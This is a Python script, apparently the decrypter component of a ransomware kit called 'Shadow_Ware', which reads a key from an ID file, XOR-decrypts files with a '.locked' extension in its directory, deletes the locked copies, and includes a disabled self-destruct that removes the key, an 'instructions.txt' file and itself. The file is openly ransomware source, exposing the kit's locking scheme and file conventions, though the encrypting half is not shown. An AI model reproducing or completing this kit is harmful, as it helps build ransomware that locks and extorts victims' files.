#!/usr/bin/env python3

import base64, os, hashlib, hmac, time

""" Class for encrypter """
class Shadow_Ware():
  def __init__(self):
    self.ignored_files = ["Copyright Preston E.md"]

    # Keys and ID
    self.bytes_key = self.get_key()

    # Current Dir
    self.current_dir = os.path.dirname(__file__)

  def get_key(self):
      key = ""
      with open("ID.id", "rb") as ID:
          key = base64.b64decode(ID.read())
      return key

  def get_bytes_key(self, key):
    return key.encode("utf-8")

  # Get all files 
  def get_file_in_dir(self, dir):
    files = []
    for file in os.listdir(dir):
      if file not in self.ignored_files:
        files.append(file)
    return files

  def get_dir_in_dir(self, dir):
    directories = []
    for root, dirs, files in os.walk(dir):
      for directory in dirs:
        if directory not in self.ignored_files:
          directories.append(directory)
    return directories

  def get_all_files(self, dir):
    all_files = []
    for root, dirs, files in os.walk(dir):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path not in self.ignored_files:
                all_files.append(file_path)
    return all_files


  # Decryption code
  def decrypt_file(self, input_file, output_file):
      # Reading input file
      try:
          with open(input_file, "rb") as file:
              encrypted_data = file.read()
      except Exception as e:
          print(f"Failed to read {input_file} because {e}")

      # Decrypting file data
      try:
        decrypted_data = bytearray(len(encrypted_data))
        for i in range(len(encrypted_data)):
            decrypted_data[i] = encrypted_data[i] ^ self.bytes_key[i % len(self.bytes_key)]
      except Exception as e:
         print(f"Failed to decrypt data of {input_file} because {e}")

      try:
        with open(output_file, "wb") as file:
            file.write(decrypted_data)
      except Exception as e:
        print(f"Failed to write data to {output_file} because {e}")


  # Encrypt All Files
  def decrypt_all_files(self):
    files = self.get_all_files(self.current_dir)
    for file in files:
      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath(__file__) and file.endswith(".locked"):
        print("Unlocking file " + file)
        self.decrypt_file(file, file[0:-7])

  # Remove not locked files
  def remove_locked_files(self):
    files = self.get_all_files(self.current_dir)
    for file in files:
        if file.endswith(".locked"):
          try:
            print("Removing " + file)
            os.remove(file)
          except Exception as e:
             print("Failed to remove " + file + "because " + e)

  def self_destruct(self):
    time.sleep(3)
    print("Decrypter: Self Destructing")
    try:
      os.remove(os.path.abspath("ID.id"))
    except Exception as e:
      print("Failed to remove ID.id for " + e)
    try:
        os.remove(os.path.abspath("instructions.txt"))
    except Exception as e:
      print("Failed to remove instructions.txt for " + e)
    os.remove(os.path.abspath(__file__))

if __name__ == "__main__":
  shadow_ware = Shadow_Ware()
  shadow_ware.decrypt_all_files()
  shadow_ware.remove_locked_files()
  #shadow_ware.self_destruct()
